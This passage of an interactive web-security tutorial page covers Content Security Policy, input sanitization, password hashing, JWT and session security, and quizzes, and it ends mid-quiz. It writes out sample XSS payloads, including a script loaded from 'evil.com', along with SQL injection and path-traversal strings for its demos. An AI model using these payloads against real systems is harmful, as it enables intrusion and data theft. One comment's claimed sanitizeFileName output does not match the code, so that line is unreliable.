              ‚ùå <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ‚Üí Inline scripts: BLOCKED
            </div>
            <div style="padding: 12px 20px; background: rgba(255,62,108,0.1); border: 1px solid var(--danger); border-radius: 8px; margin: 8px 0;">
              ‚ùå <code>&lt;script src="evil.com/xss.js"&gt;</code> ‚Üí Unknown source: BLOCKED
            </div>
          </div>
        </div>
      </div>

      <!-- CSP Directives -->
      <div class="card">
        <h3>üìù CSP Directives Reference</h3>

        <table class="comparison-table">
          <tr><th>Directive</th><th>Controls</th><th>Example</th></tr>
          <tr><td><code>default-src</code></td><td>Fallback for all resource types</td><td><code>'self'</code></td></tr>
          <tr><td><code>script-src</code></td><td>JavaScript sources</td><td><code>'self' cdn.js.com</code></td></tr>
          <tr><td><code>style-src</code></td><td>CSS sources</td><td><code>'self' 'unsafe-inline'</code></td></tr>
          <tr><td><code>img-src</code></td><td>Image sources</td><td><code>'self' data: https:</code></td></tr>
          <tr><td><code>connect-src</code></td><td>Fetch/XHR/WebSocket</td><td><code>'self' api.example.com</code></td></tr>
          <tr><td><code>font-src</code></td><td>Font files</td><td><code>'self' fonts.gstatic.com</code></td></tr>
          <tr><td><code>frame-src</code></td><td>Iframe sources</td><td><code>'none'</code></td></tr>
          <tr><td><code>object-src</code></td><td>Plugins (Flash, etc.)</td><td><code>'none'</code></td></tr>
          <tr><td><code>report-uri</code></td><td>Where to send violation reports</td><td><code>/csp-report</code></td></tr>
        </table>
      </div>

      <!-- CSP Builder -->
      <div class="card">
        <h3>üîß Interactive: CSP Header Builder</h3>
        <p>Build your own CSP header by selecting directives:</p>

        <div class="demo-container">
          <h4>‚ö° CSP Builder</h4>
          <div class="csp-builder">
            <div class="csp-directive">
              <label>default-src:</label>
              <select id="csp-default" onchange="buildCSP()">
                <option value="'self'">'self'</option>
                <option value="'none'">'none'</option>
                <option value="*">* (any)</option>
              </select>
            </div>
            <div class="csp-directive">
              <label>script-src:</label>
              <select id="csp-script" onchange="buildCSP()">
                <option value="'self'">'self'</option>
                <option value="'self' 'nonce-abc123'">'self' with nonce</option>
                <option value="'self' cdn.jsdelivr.net">'self' + CDN</option>
                <option value="'none'">'none'</option>
                <option value="'self' 'unsafe-inline'">'self' 'unsafe-inline' ‚ö†Ô∏è</option>
              </select>
            </div>
            <div class="csp-directive">
              <label>style-src:</label>
              <select id="csp-style" onchange="buildCSP()">
                <option value="'self'">'self'</option>
                <option value="'self' 'unsafe-inline'">'self' 'unsafe-inline'</option>
                <option value="'self' fonts.googleapis.com">'self' + Google Fonts</option>
              </select>
            </div>
            <div class="csp-directive">
              <label>img-src:</label>
              <select id="csp-img" onchange="buildCSP()">
                <option value="'self'">'self'</option>
                <option value="'self' data:">'self' data:</option>
                <option value="*">* (any)</option>
              </select>
            </div>
            <div class="csp-directive">
              <label>object-src:</label>
              <select id="csp-object" onchange="buildCSP()">
                <option value="'none'">'none'</option>
                <option value="'self'">'self'</option>
              </select>
            </div>
            <div class="csp-directive">
              <label>frame-ancestors:</label>
              <select id="csp-frame" onchange="buildCSP()">
                <option value="'none'">'none' (no framing)</option>
                <option value="'self'">'self'</option>
              </select>
            </div>
          </div>

          <div style="margin-top: 15px;">
            <strong>Generated Header:</strong>
            <div class="csp-output" id="cspOutput">Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; object-src 'none'; frame-ancestors 'none'</div>
          </div>

          <div style="margin-top: 15px;">
            <strong>Express.js Code:</strong>
            <div class="code-block code-good" id="cspCode" style="font-size: 0.78rem;">
app.<span class="func">use</span>((req, res, next) => {
  res.<span class="func">setHeader</span>(<span class="string">'Content-Security-Policy'</span>,
    <span class="string">"default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; object-src 'none'; frame-ancestors 'none'"</span>
  );
  <span class="func">next</span>();
});
            </div>
          </div>
        </div>
      </div>

      <!-- CSP Nonce -->
      <div class="card">
        <h3>üîê Using Nonces for Inline Scripts</h3>
        <p>Instead of allowing all inline scripts (unsafe!), use a one-time nonce:</p>

        <div class="code-block code-good">
          <span class="label good">Safe Nonce Pattern</span>
<span class="comment">// Server generates unique nonce per request</span>
<span class="keyword">const</span> crypto = <span class="func">require</span>(<span class="string">'crypto'</span>);
<span class="keyword">const</span> nonce = crypto.<span class="func">randomBytes</span>(<span class="num">16</span>).<span class="func">toString</span>(<span class="string">'base64'</span>);

<span class="comment">// Set CSP header with nonce</span>
res.<span class="func">setHeader</span>(<span class="string">'Content-Security-Policy'</span>,
  <span class="string">`script-src 'nonce-${nonce}'`</span>
);

<span class="comment">// Only scripts with matching nonce will execute</span>
<span class="tag">&lt;script</span> <span class="attr">nonce</span>=<span class="value">"<%= nonce %>"</span><span class="tag">&gt;</span>
  <span class="comment">// ‚úÖ This runs ‚Äî nonce matches!</span>
  console.<span class="func">log</span>(<span class="string">'Legitimate script'</span>);
<span class="tag">&lt;/script&gt;</span>

<span class="tag">&lt;script&gt;</span>
  <span class="comment">// ‚ùå BLOCKED ‚Äî no nonce!</span>
  alert(<span class="string">'XSS attempt'</span>);
<span class="tag">&lt;/script&gt;</span>
        </div>
      </div>

      <div class="pitfall-box">
        <h4>‚ö†Ô∏è CSP Pitfalls</h4>
        <ul>
          <li><strong>Using 'unsafe-inline':</strong> Defeats the purpose of CSP for XSS protection. Use nonces instead!</li>
          <li><strong>Using 'unsafe-eval':</strong> Allows eval(), Function(), setTimeout(string) ‚Äî very dangerous.</li>
          <li><strong>Overly permissive policies:</strong> <code>default-src *</code> provides zero protection.</li>
          <li><strong>Not using report-uri:</strong> You won't know about violations or attacks without reporting.</li>
          <li><strong>Forgetting object-src:</strong> Plugin-based attacks bypass script-src. Always set <code>object-src 'none'</code>.</li>
        </ul>
      </div>

      <!-- CSP Quiz -->
      <div class="card">
        <h3>üß† Quiz: CSP Knowledge Check</h3>

        <div class="quiz-question" data-quiz="csp1">
          <h4>‚ùì Q1: What does <code>script-src 'self'</code> allow?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp1')">All scripts from any source</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'csp1')">Only scripts from the same origin</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp1')">Only inline scripts</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp1')">No scripts at all</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="csp1">'self' means only scripts loaded from the same origin (same scheme, host, and port). Inline scripts and scripts from other domains are blocked.</div>
        </div>

        <div class="quiz-question" data-quiz="csp2">
          <h4>‚ùì Q2: Why is <code>'unsafe-inline'</code> dangerous?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp2')">It slows down the page</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp2')">It breaks CSS styling</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'csp2')">It allows injected inline scripts to execute, defeating XSS protection</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csp2')">It's deprecated</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="csp2">If an attacker injects &lt;script&gt;malicious_code&lt;/script&gt; into your page, 'unsafe-inline' tells the browser to run it. This completely defeats CSP's XSS protection.</div>
        </div>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('csrf-protection')">‚Üê CSRF Protection</button>
        <button class="demo-btn btn-primary" onclick="showSection('sanitization')">Input Sanitization ‚Üí</button>
      </div>
    </div>

    <!-- ==================== INPUT SANITIZATION ==================== -->
    <div class="section" id="section-sanitization">
      <div class="section-header">
        <h2>üßπ Input Sanitization</h2>
        <p>Never trust user input. Learn to validate, sanitize, and escape everything.</p>
      </div>

      <div class="card">
        <h3>üéØ The Golden Rule</h3>
        <div style="text-align: center; padding: 20px; font-size: 1.3rem; font-weight: 700; background: rgba(255,62,108,0.1); border: 2px solid var(--danger); border-radius: var(--radius); margin: 10px 0;">
          üö® NEVER trust ANY input from the client. EVER. üö®
        </div>
        <p style="margin-top: 15px;">This includes: form fields, URL parameters, cookies, HTTP headers, file uploads, WebSocket messages, localStorage, and even data from your own API (it could be tampered with).</p>
      </div>

      <div class="card">
        <h3>üìã Validate vs Sanitize vs Escape</h3>

        <div class="grid-2" style="grid-template-columns: 1fr 1fr 1fr;">
          <div style="padding: 15px; background: rgba(0,240,255,0.05); border: 1px solid var(--accent); border-radius: 10px;">
            <h4 style="color: var(--accent);">‚úÖ Validate</h4>
            <p style="font-size: 0.85rem;">Check if input matches expected format. Reject if not.</p>
            <div style="font-size: 0.8rem; color: var(--text-dim); margin-top: 5px;">
              "Is this a valid email?"<br>"Is this a number between 1-100?"
            </div>
          </div>
          <div style="padding: 15px; background: rgba(124,58,237,0.1); border: 1px solid var(--accent2); border-radius: 10px;">
            <h4 style="color: var(--accent2);">üßπ Sanitize</h4>
            <p style="font-size: 0.85rem;">Clean/transform input to remove dangerous parts.</p>
            <div style="font-size: 0.8rem; color: var(--text-dim); margin-top: 5px;">
              "Remove all HTML tags"<br>"Strip non-alphanumeric chars"
            </div>
          </div>
          <div style="padding: 15px; background: rgba(0,230,118,0.05); border: 1px solid var(--success); border-radius: 10px;">
            <h4 style="color: var(--success);">üîí Escape</h4>
            <p style="font-size: 0.85rem;">Convert special characters so they're treated as data, not code.</p>
            <div style="font-size: 0.8rem; color: var(--text-dim); margin-top: 5px;">
              "&lt; becomes &amp;lt;"<br>"' becomes &amp;#x27;"
            </div>
          </div>
        </div>
      </div>

      <!-- Practical Examples -->
      <div class="card">
        <h3>üîß Practical Sanitization Examples</h3>

        <div class="tabs">
          <div class="tab active" onclick="switchTab(this, 'sanitize-tabs')">Email</div>
          <div class="tab" onclick="switchTab(this, 'sanitize-tabs')">Numbers</div>
          <div class="tab" onclick="switchTab(this, 'sanitize-tabs')">HTML</div>
          <div class="tab" onclick="switchTab(this, 'sanitize-tabs')">SQL</div>
          <div class="tab" onclick="switchTab(this, 'sanitize-tabs')">File Names</div>
        </div>

        <div class="tab-content active" data-tabgroup="sanitize-tabs">
          <h4>üìß Email Validation</h4>
          <div class="attack-type">
            <div class="attack-card vulnerable">
              <h4>‚ùå Bad Validation</h4>
              <div class="code-block code-bad" style="font-size: 0.78rem;">
<span class="comment">// Too simple!</span>
<span class="keyword">if</span> (email.<span class="func">includes</span>(<span class="string">'@'</span>)) {
  <span class="comment">// "not-email@" passes! üíÄ</span>
  <span class="comment">// "<script>@x" passes! üíÄ</span>
}
              </div>
            </div>
            <div class="attack-card safe">
              <h4>‚úÖ Proper Validation</h4>
              <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="keyword">function</span> <span class="func">isValidEmail</span>(email) {
  <span class="keyword">const</span> re = <span class="string">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>;
  <span class="keyword">if</span> (!re.<span class="func">test</span>(email)) <span class="keyword">return false</span>;
  <span class="keyword">if</span> (email.<span class="prop">length</span> > <span class="num">254</span>) <span class="keyword">return false</span>;
  <span class="keyword">return true</span>;
}
              </div>
            </div>
          </div>
        </div>

        <div class="tab-content" data-tabgroup="sanitize-tabs">
          <h4>üî¢ Number Validation</h4>
          <div class="attack-type">
            <div class="attack-card vulnerable">
              <h4>‚ùå Unsafe</h4>
              <div class="code-block code-bad" style="font-size: 0.78rem;">
<span class="comment">// Never use eval for parsing!</span>
<span class="keyword">const</span> price = <span class="func">eval</span>(userInput);

<span class="comment">// parseInt can be tricky</span>
<span class="func">parseInt</span>(<span class="string">"42abc"</span>); <span class="comment">// ‚Üí 42 (no error!)</span>
              </div>
            </div>
            <div class="attack-card safe">
              <h4>‚úÖ Safe</h4>
              <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="keyword">function</span> <span class="func">safeParseInt</span>(val, min, max) {
  <span class="keyword">const</span> num = <span class="func">Number</span>(val);
  <span class="keyword">if</span> (!Number.<span class="func">isFinite</span>(num)) <span class="keyword">return null</span>;
  <span class="keyword">if</span> (num < min || num > max) <span class="keyword">return null</span>;
  <span class="keyword">return</span> Math.<span class="func">floor</span>(num);
}
              </div>
            </div>
          </div>
        </div>

        <div class="tab-content" data-tabgroup="sanitize-tabs">
          <h4>üè∑Ô∏è HTML Sanitization</h4>
          <div class="code-block code-good">
            <span class="label good">Whitelist Approach</span>
<span class="comment">// Using DOMPurify library (recommended)</span>
<span class="keyword">import</span> DOMPurify <span class="keyword">from</span> <span class="string">'dompurify'</span>;

<span class="keyword">const</span> clean = DOMPurify.<span class="func">sanitize</span>(dirtyHTML, {
  <span class="prop">ALLOWED_TAGS</span>: [<span class="string">'b'</span>, <span class="string">'i'</span>, <span class="string">'em'</span>, <span class="string">'strong'</span>, <span class="string">'a'</span>],
  <span class="prop">ALLOWED_ATTR</span>: [<span class="string">'href'</span>]
});

<span class="comment">// Input:  &lt;b&gt;Bold&lt;/b&gt;&lt;script&gt;evil()&lt;/script&gt;&lt;img onerror=hack&gt;</span>
<span class="comment">// Output: &lt;b&gt;Bold&lt;/b&gt;</span>
          </div>

          <div class="code-block code-good">
            <span class="label good">Vanilla JS (Basic)</span>
<span class="keyword">function</span> <span class="func">stripHTML</span>(str) {
  <span class="keyword">const</span> div = <span class="prop">document</span>.<span class="func">createElement</span>(<span class="string">'div'</span>);
  div.<span class="prop">textContent</span> = str; <span class="comment">// Treats as text, not HTML</span>
  <span class="keyword">return</span> div.<span class="prop">innerHTML</span>;    <span class="comment">// Returns escaped version</span>
}
          </div>
        </div>

        <div class="tab-content" data-tabgroup="sanitize-tabs">
          <h4>üóÑÔ∏è SQL Injection Prevention</h4>
          <div class="attack-type">
            <div class="attack-card vulnerable">
              <h4>‚ùå SQL Injection</h4>
              <div class="code-block code-bad" style="font-size: 0.78rem;">
<span class="comment">// String concatenation = disaster</span>
<span class="keyword">const</span> query = <span class="string">`SELECT * FROM users
  WHERE name = '${userName}'`</span>;
<span class="comment">// userName: ' OR '1'='1</span>
<span class="comment">// ‚Üí SELECT * FROM users</span>
<span class="comment">//   WHERE name = '' OR '1'='1'</span>
<span class="comment">// Returns ALL users! üíÄ</span>
              </div>
            </div>
            <div class="attack-card safe">
              <h4>‚úÖ Parameterized Query</h4>
              <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="comment">// Use parameterized queries</span>
<span class="keyword">const</span> query = <span class="string">'SELECT * FROM users WHERE name = ?'</span>;
db.<span class="func">execute</span>(query, [userName]);

<span class="comment">// Or with named parameters</span>
db.<span class="func">query</span>(<span class="string">'SELECT * FROM users WHERE name = :name'</span>,
  { <span class="prop">name</span>: userName });
              </div>
            </div>
          </div>
        </div>

        <div class="tab-content" data-tabgroup="sanitize-tabs">
          <h4>üìÅ File Name Sanitization</h4>
          <div class="code-block code-good">
            <span class="label good">Safe</span>
<span class="keyword">function</span> <span class="func">sanitizeFileName</span>(name) {
  <span class="keyword">return</span> name
    .<span class="func">replace</span>(<span class="string">/[^a-zA-Z0-9.-]/g</span>, <span class="string">'_'</span>)  <span class="comment">// Remove special chars</span>
    .<span class="func">replace</span>(<span class="string">/\.{2,}/g</span>, <span class="string">'.'</span>)           <span class="comment">// No path traversal (..)</span>
    .<span class="func">substring</span>(<span class="num">0</span>, <span class="num">255</span>);                 <span class="comment">// Limit length</span>
}

<span class="comment">// "../../../etc/passwd" ‚Üí "_.._.._.._etc_passwd"</span>
          </div>
        </div>
      </div>

      <!-- Interactive Sanitization Demo -->
      <div class="card">
        <h3>üî¨ Interactive: Sanitization Playground</h3>

        <div class="demo-container">
          <h4>‚ö° Test Sanitization Methods</h4>
          <input type="text" class="demo-input" id="sanitizeInput" placeholder="Type potentially malicious input..." value='<script>alert("XSS")</script>'>

          <div class="toggle-group">
            <button class="toggle-btn" onclick="setSanitizeInput('<script>alert(\"XSS\")</script>')">Script Tag</button>
            <button class="toggle-btn" onclick="setSanitizeInput('<img src=x onerror=alert(1)>')">Img Onerror</button>
            <button class="toggle-btn" onclick="setSanitizeInput('Hello <b>World</b>')">HTML Tags</button>
            <button class="toggle-btn" onclick="setSanitizeInput('\' OR 1=1 --')">SQL Injection</button>
            <button class="toggle-btn" onclick="setSanitizeInput('../../etc/passwd')">Path Traversal</button>
          </div>

          <button class="demo-btn btn-primary" onclick="runSanitization()" style="margin-top: 10px;">üßπ Apply All Sanitization Methods</button>

          <div class="demo-output" id="sanitizeOutput" style="margin-top: 15px;">
            <div style="color: var(--text-dim); font-style: italic;">Click "Apply" to see results...</div>
          </div>
        </div>
      </div>

      <!-- Sanitization Exercise -->
      <div class="exercise-container">
        <h4>üí™ Exercise: Write a Validation Function</h4>
        <p>Write a function that validates a username with these rules: 3-20 characters, alphanumeric and underscores only.</p>

        <textarea class="code-editor" id="sanitizeExercise1">function isValidUsername(username) {
  // Your code here:
  // - Must be 3-20 characters
  // - Only letters, numbers, and underscores
  // - Return true or false

}</textarea>

        <button class="demo-btn btn-primary" onclick="checkSanitizeExercise()">Check Solution ‚úì</button>
        <div class="exercise-result" id="sanitizeExResult1"></div>
      </div>

      <div class="pitfall-box">
        <h4>‚ö†Ô∏è Input Sanitization Pitfalls</h4>
        <ul>
          <li><strong>Client-side only validation:</strong> ALWAYS validate on the server too. Client validation can be bypassed.</li>
          <li><strong>Blacklisting instead of whitelisting:</strong> Define what IS allowed, not what isn't. Attackers always find bypasses.</li>
          <li><strong>Not validating data types:</strong> A "number" field might receive <code>"__proto__"</code> causing prototype pollution.</li>
          <li><strong>Double encoding:</strong> Sanitizing twice can produce valid attack strings. <code>&amp;lt;</code> ‚Üí <code>&lt;</code></li>
          <li><strong>Forgetting about Unicode:</strong> Attackers use homograph attacks (Cyrillic '–∞' vs Latin 'a').</li>
        </ul>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('csp')">‚Üê CSP</button>
        <button class="demo-btn btn-primary" onclick="showSection('auth')">Secure Auth ‚Üí</button>
      </div>
    </div>

    <!-- ==================== AUTH ==================== -->
    <div class="section" id="section-auth">
      <div class="section-header">
        <h2>üîë Secure Authentication</h2>
        <p>Implement authentication that can't be easily broken.</p>
      </div>

      <!-- Password Storage -->
      <div class="card">
        <h3>üîê Password Storage</h3>

        <div class="attack-type">
          <div class="attack-card vulnerable">
            <h4>‚ùå NEVER Do These</h4>
            <div class="code-block code-bad" style="font-size: 0.78rem;">
<span class="comment">// Plain text üíÄüíÄüíÄ</span>
db.<span class="func">save</span>({ <span class="prop">password</span>: <span class="string">"user123"</span> });

<span class="comment">// Simple hash (reversible via rainbow tables)</span>
<span class="keyword">const</span> hash = <span class="func">md5</span>(password);
<span class="keyword">const</span> hash = <span class="func">sha256</span>(password);

<span class="comment">// Hash + static salt</span>
<span class="keyword">const</span> hash = <span class="func">sha256</span>(password + <span class="string">"fixedSalt"</span>);
            </div>
          </div>
          <div class="attack-card safe">
            <h4>‚úÖ Use bcrypt / scrypt / argon2</h4>
            <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="keyword">const</span> bcrypt = <span class="func">require</span>(<span class="string">'bcrypt'</span>);

<span class="comment">// Registration - hash password</span>
<span class="keyword">const</span> salt = <span class="keyword">await</span> bcrypt.<span class="func">genSalt</span>(<span class="num">12</span>);
<span class="keyword">const</span> hash = <span class="keyword">await</span> bcrypt.<span class="func">hash</span>(password, salt);
db.<span class="func">save</span>({ <span class="prop">passwordHash</span>: hash });

<span class="comment">// Login - verify</span>
<span class="keyword">const</span> valid = <span class="keyword">await</span> bcrypt.<span class="func">compare</span>(
  inputPassword, user.<span class="prop">passwordHash</span>
);
            </div>
          </div>
        </div>
      </div>

      <!-- JWT Security -->
      <div class="card">
        <h3>üé´ JWT (JSON Web Token) Security</h3>

        <div class="diagram">
          <div style="display: inline-block; text-align: left; background: var(--bg-card); border-radius: 10px; padding: 20px;">
            <div style="margin-bottom: 10px;"><span style="color: var(--danger); font-family: var(--mono);">eyJhbGciOiJIUzI1NiJ9</span> <span class="badge badge-danger">Header</span></div>
            <div style="margin-bottom: 10px;"><span style="color: var(--accent2); font-family: var(--mono);">eyJ1c2VySWQiOjEyMzR9</span> <span class="badge badge-info">Payload</span></div>
            <div><span style="color: var(--success); font-family: var(--mono);">SflKxwRJSMeKKF2QT4fwp</span> <span class="badge badge-success">Signature</span></div>
          </div>
        </div>

        <div class="code-block code-good">
          <span class="label good">Secure JWT</span>
<span class="keyword">const</span> jwt = <span class="func">require</span>(<span class="string">'jsonwebtoken'</span>);
<span class="keyword">const</span> SECRET = process.<span class="prop">env</span>.<span class="prop">JWT_SECRET</span>; <span class="comment">// Strong, env variable!</span>

<span class="comment">// Create token</span>
<span class="keyword">const</span> token = jwt.<span class="func">sign</span>(
  {
    <span class="prop">userId</span>: user.<span class="prop">id</span>,
    <span class="prop">role</span>: user.<span class="prop">role</span>,
    <span class="comment">// Never put sensitive data in payload!</span>
  },
  SECRET,
  {
    <span class="prop">expiresIn</span>: <span class="string">'1h'</span>,        <span class="comment">// Short expiry</span>
    <span class="prop">algorithm</span>: <span class="string">'HS256'</span>,      <span class="comment">// Specify algorithm!</span>
    <span class="prop">issuer</span>: <span class="string">'myapp.com'</span>,     <span class="comment">// Verify issuer</span>
  }
);

<span class="comment">// Verify token</span>
<span class="keyword">try</span> {
  <span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, SECRET, {
    <span class="prop">algorithms</span>: [<span class="string">'HS256'</span>], <span class="comment">// Whitelist algorithm!</span>
    <span class="prop">issuer</span>: <span class="string">'myapp.com'</span>,
  });
} <span class="keyword">catch</span> (err) {
  <span class="comment">// Token invalid or expired</span>
  <span class="keyword">return</span> res.<span class="func">status</span>(<span class="num">401</span>).<span class="func">json</span>({ <span class="prop">error</span>: <span class="string">'Unauthorized'</span> });
}
        </div>

        <div class="pitfall-box">
          <h4>‚ö†Ô∏è JWT Pitfalls</h4>
          <ul>
            <li><strong>Algorithm confusion attack:</strong> Always specify <code>algorithms: ['HS256']</code> when verifying. Without it, attacker can change alg to 'none'!</li>
            <li><strong>Storing in localStorage:</strong> Accessible via XSS. Use httpOnly cookies instead.</li>
            <li><strong>No expiration:</strong> Always set <code>expiresIn</code>. Token theft = permanent access otherwise.</li>
            <li><strong>Sensitive data in payload:</strong> JWT payload is base64 encoded, NOT encrypted. Anyone can read it!</li>
          </ul>
        </div>
      </div>

      <!-- Session Management -->
      <div class="card">
        <h3>üì¶ Secure Session Management</h3>

        <div class="code-block code-good">
          <span class="label good">Session Best Practices</span>
<span class="keyword">const</span> session = <span class="func">require</span>(<span class="string">'express-session'</span>);

app.<span class="func">use</span>(<span class="func">session</span>({
  <span class="prop">secret</span>: process.<span class="prop">env</span>.<span class="prop">SESSION_SECRET</span>,
  <span class="prop">name</span>: <span class="string">'__session'</span>,        <span class="comment">// Don't use default 'connect.sid'</span>
  <span class="prop">resave</span>: <span class="keyword">false</span>,
  <span class="prop">saveUninitialized</span>: <span class="keyword">false</span>, <span class="comment">// Don't create until data stored</span>
  <span class="prop">cookie</span>: {
    <span class="prop">httpOnly</span>: <span class="keyword">true</span>,           <span class="comment">// No JS access</span>
    <span class="prop">secure</span>: <span class="keyword">true</span>,             <span class="comment">// HTTPS only</span>
    <span class="prop">sameSite</span>: <span class="string">'strict'</span>,       <span class="comment">// CSRF protection</span>
    <span class="prop">maxAge</span>: <span class="num">1800000</span>,          <span class="comment">// 30 minutes</span>
    <span class="prop">domain</span>: <span class="string">'myapp.com'</span>,
    <span class="prop">path</span>: <span class="string">'/'</span>,
  },
  <span class="prop">store</span>: <span class="keyword">new</span> <span class="func">RedisStore</span>(),  <span class="comment">// Use Redis, not memory!</span>
}));

<span class="comment">// Regenerate session ID after login (prevent fixation)</span>
app.<span class="func">post</span>(<span class="string">'/login'</span>, (req, res) => {
  <span class="keyword">if</span> (<span class="func">authenticate</span>(req.<span class="prop">body</span>)) {
    req.session.<span class="func">regenerate</span>(() => {  <span class="comment">// New session ID!</span>
      req.session.<span class="prop">userId</span> = user.<span class="prop">id</span>;
      res.<span class="func">redirect</span>(<span class="string">'/dashboard'</span>);
    });
  }
});
        </div>
      </div>

      <!-- Auth Checklist -->
      <div class="card">
        <h3>‚úÖ Authentication Security Checklist</h3>
        <ul class="checklist" id="authChecklist">
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Hash passwords with bcrypt/scrypt/argon2 (cost factor ‚â• 12)</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Use HTTPS everywhere (never send credentials over HTTP)</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Implement rate limiting on login endpoints</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Lock accounts after N failed attempts</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Use generic error messages ("Invalid credentials" not "Wrong password")</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Set secure cookie flags (httpOnly, secure, sameSite)</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Regenerate session ID after login</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Implement MFA/2FA for sensitive actions</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Validate JWT algorithm on verification</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Set short token expiration times</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Don't store tokens in localStorage</li>
          <li onclick="toggleCheck(this)"><span class="check-mark">‚òê</span> Implement proper logout (invalidate server-side session)</li>
        </ul>
      </div>

      <!-- Token Storage Quiz -->
      <div class="card">
        <h3>üß† Quiz: Authentication Security</h3>

        <div class="quiz-question" data-quiz="auth1">
          <h4>‚ùì Q1: Where should you store JWT tokens?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth1')">localStorage</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth1')">sessionStorage</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'auth1')">httpOnly secure cookie</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth1')">In a JavaScript variable</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="auth1">httpOnly cookies can't be accessed by JavaScript (XSS protection), and the secure flag ensures HTTPS-only transmission. localStorage is vulnerable to XSS attacks.</div>
        </div>

        <div class="quiz-question" data-quiz="auth2">
          <h4>‚ùì Q2: Why use bcrypt instead of SHA-256?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth2')">SHA-256 is broken</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'auth2')">bcrypt is intentionally slow, making brute-force impractical</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth2')">SHA-256 produces shorter hashes</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth2')">bcrypt is newer</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="auth2">bcrypt includes a configurable "cost factor" that makes it deliberately slow. SHA-256 is designed to be fast, which means attackers can try billions of passwords per second. bcrypt might only allow thousands.</div>
        </div>

        <div class="quiz-question" data-quiz="auth3">
          <h4>‚ùì Q3: What's the JWT algorithm confusion attack?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth3')">Using an outdated algorithm</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth3')">Mixing up encryption and hashing</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'auth3')">Changing the alg header to 'none' to bypass signature verification</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'auth3')">Using different algorithms for encoding and decoding</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="auth3">If the server doesn't whitelist allowed algorithms, an attacker can change the JWT header to alg:"none" and remove the signature. Some libraries accept this as valid! Always specify allowed algorithms when verifying.</div>
        </div>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('sanitization')">‚Üê Input Sanitization</button>
        <button class="demo-btn btn-primary" onclick="showSection('quiz-final')">Final Challenge ‚Üí</button>
      </div>
    </div>

    <!-- ==================== FINAL QUIZ ==================== -->
    <div class="section" id="section-quiz-final">
      <div class="section-header">
        <h2>üèÜ Final Security Challenge</h2>
        <p>Test your knowledge across all security topics. Can you get a perfect score?</p>
      </div>

      <div class="card">
        <h3>üéØ Challenge: 10 Questions</h3>
        <div id="finalQuizScore" style="text-align: center; padding: 15px; background: var(--bg-card2); border-radius: 10px; margin-bottom: 20px;">
          Score: <span id="fqScore">0</span>/10 <span id="fqStreak" class="streak-badge" style="display:none;">üî• 0 streak</span>
        </div>

        <div class="quiz-question" data-quiz="fq1">
          <h4>‚ùì Q1: What does the 'httpOnly' cookie flag prevent?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq1')">Sending cookies over HTTP</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq1')">JavaScript access to the cookie via document.cookie</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq1')">Cookies being sent with AJAX requests</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq1')">Server-side access to the cookie</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq1">httpOnly prevents JavaScript from reading the cookie. Even if XSS occurs, the attacker can't steal the session cookie.</div>
        </div>

        <div class="quiz-question" data-quiz="fq2">
          <h4>‚ùì Q2: Which is the MOST secure way to insert user text into the DOM?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq2')">element.innerHTML = text</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq2')">element.textContent = text</div>
